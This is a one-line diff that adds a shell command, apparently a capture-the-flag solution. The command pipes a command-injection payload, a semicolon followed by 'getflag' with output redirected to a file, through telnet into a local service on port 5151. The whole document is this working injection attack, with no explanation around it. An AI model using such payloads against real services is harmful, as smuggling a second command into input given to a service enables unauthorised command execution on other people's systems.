@@ -1,0 +1,1 @@
+echo "; getflag > /tmp/t" | telnet 127.0.0.1 5151
